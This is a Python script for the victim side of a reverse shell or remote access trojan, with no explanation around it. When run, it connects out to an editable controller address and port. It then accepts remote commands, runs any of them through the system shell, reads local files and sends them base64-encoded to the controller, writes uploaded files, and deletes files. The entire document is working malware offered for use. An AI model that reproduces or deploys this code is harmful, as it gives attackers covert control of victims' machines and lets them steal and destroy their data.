import socket
import subprocess
import json
import os
import base64

# You Can Edit this  !!!!!!!!!!!!!!
victim_ip = "1.1.1.1"
victim_port = 1111

victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
victim_socket.connect((victim_ip, victim_port))

def execute_system_command(command):
    return subprocess.check_output(command, shell=True, text=True)

def send_safe(data):
    json_data = json.dumps(data)
    victim_socket.send(json_data.encode())

def send_file_safe(data):
    victim_socket.sendall(data + b"END_OF_FILE")

def receive_safe():
    json_data = ""
    while True:
        try:
            json_data = victim_socket.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

def change_directory(path):
    os.chdir(path)
    return "[+] Changed path to " + path

def read_file_from_disk(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read())
    
def write_file_to_disk(path, content):
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
    return "[+] Upload is successful"

def delete_file_from_disk(path):
    try:
        os.remove(path)
        return "[+] File deleted successfully"
    except Exception as e:
        return f"[-] Error deleting file: {e}"

def run_victim():
    while True:
        try:
            command = receive_safe()
            if command[0] == "exit":
                victim_socket.close()
                break
            elif command[0] == "cd" and len(command) > 1:
                command_result = change_directory(command[1])
            elif command[0] == "download" or command[0] == "dw":
                file_data = read_file_from_disk(command[1])
                send_file_safe(file_data)
                continue
            elif command[0] == "upload" and len(command) > 2:
                command_result = write_file_to_disk(command[1], command[2])
            elif command[0] == "delete" and len(command) > 1:
                command_result = delete_file_from_disk(command[1])
            else:
                command_result = execute_system_command(" ".join(command))
        except Exception as e:
            command_result = f"An error occurred: {e}"
        
        send_safe(command_result)

run_victim()
